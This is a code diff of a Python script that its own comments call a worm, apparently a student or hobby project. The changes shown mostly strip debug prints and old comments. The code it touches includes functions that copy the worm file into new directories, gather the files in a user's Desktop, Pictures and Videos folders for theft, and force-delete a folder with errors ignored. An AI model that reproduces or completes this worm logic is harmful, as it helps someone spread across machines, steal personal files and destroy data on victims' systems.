@@ -11,15 +11,10 @@ import socket #should allow me to pull the ip address of the host machine of the
 import platform #gives me system info
 from sys import argv #uses arguments 
 import subprocess #allows you to use terminal commands 
-import shutil #allows use to do file movement
-
-
-
+import shutil #file moving
 
 def wiggle():
     #the purpose of this function is to allow the worm to move and find files
-
-    print('I am staring in the wiggle')
 
     #first check the OS
     system = platform.system()
@@ -100,21 +95,11 @@ def copyfile():
     #now you need to copy the worm file
     shutil.copy(wormie, os.getcwd())
     
-
 def take():
     #the take method will create a file and send all the other files in that folder
 
     #get the username
     username = os.getlogin()
-
-    #check for the worm.py file
-    #if os.path.exists('worm.py'):
-        #get the directory path way
-    #    wormLocation = os.path.dirname('worm.py')
-    #else:
-    #    copy()
-
-    #now we need to set a location for this file because of our delete method
 
     #first we change directories
     #os.chdir needs a path so we manully set one
@@ -140,7 +125,6 @@ def take():
     
     #send it to Desktop
     files2 = os.listdir("/home/"+username+"/Desktop")
-    print('stealing from desktop')
     #then loop through all of those files
     for filename2 in files2:
         full_name2 = os.path.join("/home/"+username+"/Desktop", filename2)
@@ -149,7 +133,6 @@ def take():
 
     #send it to Pictures
     files4 = os.listdir("/home/"+username+"/Pictures")
-    print('stealing from desktop')
     #then loop through all of those files
     for filename4 in files4:
         full_name4 = os.path.join("/home/"+username+"/Pictures", filename4)
@@ -158,7 +141,6 @@ def take():
     
     #send it to videos
     files5 = os.listdir("/home/"+username+"/Videos")
-    print('stealing from desktop')
     #then loop through all of those files
     for filename5 in files5:
         full_name5 = os.path.join("/home/"+username+"/Videos", filename5)
@@ -178,8 +160,6 @@ def delete():
     shutil.rmtree('/home/' + username + '/Documents/Winner', ignore_errors= True)
 
     #ignoring the errors will allow anything to be removed regardless of read only file status
-
-    #might have to delete from the trash bin
     
 def main():
     print("NOW STARTING")
